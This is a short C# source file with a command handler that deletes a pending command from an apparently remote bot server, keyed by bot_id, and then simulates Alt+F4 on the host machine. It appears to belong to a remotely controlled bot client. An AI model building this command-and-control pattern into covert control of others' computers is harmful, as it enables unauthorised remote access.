using WindowsInput;
using WindowsInput.Native;

namespace ConsoleApp3
{
    internal class cmd_CloseCurrentWindow
    {
        public void CloseCurrentWindow(string key, string bot_id)
        {
            post_req post_req = new post_req();
            post_req.delCommand(key, bot_id);

            var simulate = new InputSimulator();
            simulate.Keyboard.ModifiedKeyStroke(VirtualKeyCode.LMENU, VirtualKeyCode.F4);
        }
    }
}
